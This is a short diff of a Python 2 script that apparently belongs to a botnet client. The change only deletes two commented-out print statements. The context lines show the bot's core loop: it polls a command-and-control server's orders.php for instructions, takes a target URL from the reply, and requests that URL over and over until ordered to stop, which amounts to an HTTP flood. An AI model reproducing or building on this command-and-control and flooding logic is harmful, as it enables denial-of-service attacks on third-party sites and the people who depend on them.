@@ -41,11 +41,9 @@ while(True):
             if count%10 == 0:
                 orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
                 if orders[0] == "no":
-                    #print "stop attack"
                     break
                 else:
                     target = orders[1]
                 count = 0
-            #print target
             urllib2.urlopen(target)
             count += 1
